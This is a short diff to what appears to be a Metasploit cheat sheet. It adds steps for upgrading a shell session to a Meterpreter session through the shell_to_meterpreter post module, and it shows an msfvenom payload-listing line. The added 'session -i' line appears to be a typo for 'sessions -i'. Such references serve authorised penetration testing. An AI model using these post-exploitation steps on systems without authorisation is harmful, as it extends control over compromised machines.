@@ -47,6 +47,13 @@ msfvenom --list payloads | grep meterpreter # List all meterpreter payloads
 # Meterpreter
 # ===========
 
+# Getting a meterpreter session
+use post/multi/manage/shell_to_meterpreter
+sessions -l # List sessions
+set SESSION <id-of session>
+run
+session -i <New-meterpeter-session>
+
 # Core Commands
 
 background # Backgrounds the current session
